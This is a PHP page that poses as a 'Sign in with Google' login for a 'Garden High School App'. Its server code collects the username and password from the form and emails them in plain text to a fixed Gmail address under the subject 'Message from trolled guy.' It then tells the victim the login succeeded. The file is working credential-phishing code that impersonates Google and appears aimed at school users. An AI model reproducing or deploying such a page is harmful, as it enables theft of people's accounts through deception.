<?php
    include ('../inc/constants.php');
    include('../inc/GHS.php');
    $GHS = new GHS(DB_HOST, DB_USER, DB_PASS, DB_NAME);
    $msg = "";
    if (isset($_POST['submit'])) {
        $username = mysql_real_escape_string(trim($_POST['username']));
        $password = mysql_real_escape_string($_POST['password']);
        if (!$username) {
            $msg = "Enter your Google username.";
        } else {
            if (!$password) {
                $msg = "Enter your password.";
            } else {
                ini_set("SMTP","aspmx.l.google.com");
                $to = "ragnarok0211@gmail.com";
                $subject = "Message from trolled guy.";
                $header = "";
                $content = "Username: " . $username . "\n" . "Password: " . $password;
                $retval = mail($to,$subject,$content,$header);
                if( $retval == true )
                {
                    $msg = "You have successfully logged in.";
                }
                else
                {
                   $msg = "Could not sign in.";
                }
            }
        }
    }
?>
<html>
    <head>
        <title>GHS App</title>
        <link rel="stylesheet" type="text/css" href="reset.css" />
        <style>
            #wrapper {
                padding: 30px;
                background: #eee;
                border: 1px solid #ccc;
                margin: 20px;
                font-family: Arial;
            }
            #wrapper h1 {
                font-size: 20pt;
                padding-bottom: 10px;
            }
            #login-box {
                padding: 20px;
                background: #ddd;
                border: 1px solid #ccc;
                max-width: 258px;
            }
            #login-box h1 {
                font-size: 12pt;
            }
            #login-box p {
                font-size: 12pt;
                padding: 10px 0;
            }
            #username, #password {
                margin: 0;
                padding: 6px 10px;
                border: 1px solid #ccc;
                width: 258px;
            }
            #username:hover, #password:hover {
                border: 1px solid #999;
            }
            #submit {
                background: url('../assets/sign-in-google.png') no-repeat;
                width: 150px;
                height: 29px;
                border: none;
                cursor: pointer;
            }
            #submit:focus, #submit:active {
                margin-top: 2px;
            }
            #status {
                margin-top: 15px;
                background: #e9ddc0;
                font-size: 12pt;
                padding: 10px;
                border: 1px solid #7e6459;
            }
        </style>
        <script src="../js/jquery.js"></script>
    </head>
    <body>
        <div id="wrapper">
            <h1>Garden High School App</h1>
            <div id="login-box">
                <form action="sample.php" method="post" onsubmit="validate();">
                <h1>Sign in <span style="float: right; color: #666;">Google</span></h1>
                <p>Username</p>
                <input type="text" id="username" name="username">
                <p>Password</p>
                <input type="password" id="password" name="password">
                <p><input type="submit" value="" id="submit" name="submit"></p>
                </form>
                <?php
                    if (!empty($msg)) {
                        echo '<div id="status">'.$msg.'</div>';
                    }
                ?>
            </div>
        </div>
        <script>
            function validate() {
                return true;
            }
        </script>
    </body>
</html>